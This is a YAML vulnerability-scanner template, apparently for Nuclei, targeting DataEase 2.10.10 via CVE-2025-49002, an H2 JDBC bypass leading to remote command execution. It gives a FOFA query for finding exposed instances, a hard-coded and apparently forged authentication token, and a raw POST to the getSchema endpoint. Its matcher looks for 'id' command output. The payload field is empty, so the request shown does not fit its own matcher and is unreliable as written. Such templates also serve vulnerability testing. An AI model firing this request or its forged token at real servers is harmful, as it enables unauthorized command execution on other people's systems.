id: DataEase-getSchema-RCE

info:
  name: DataEase 2.10.10 H2 JDBC Bypass CVE-2025-49002 远程命令执行
  author: HuanXiong
  severity: critical
  description: |-
    fofa: title=="DataEase"
    DataEase getSchema 接口存在远程命令执行漏洞，经过身份验证的恶意攻击者可以利用该漏洞远程执行任意命令，获取系统权限。
  reference:
    - 
  tags: RCE
  
http:
  - raw:
      - |-
        POST /de2api/datasource/getSchema HTTP/1.1
        Host: {{Hostname}}
        X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36 
        Content-Type: application/json
        Connection: close

        {
          "id": "",
          "name": "11",
          "description": "",
          "type": "h2",
          "apiConfiguration": [],
          "paramsConfiguration": [],
          "enableDataFill": false,
          "configuration": ""
        }


    matchers:
      - type: dsl
        name: 远程命令执行
        dsl:
          - 'status_code==200 && contains_all(body,"uid=","gid=","groups=")'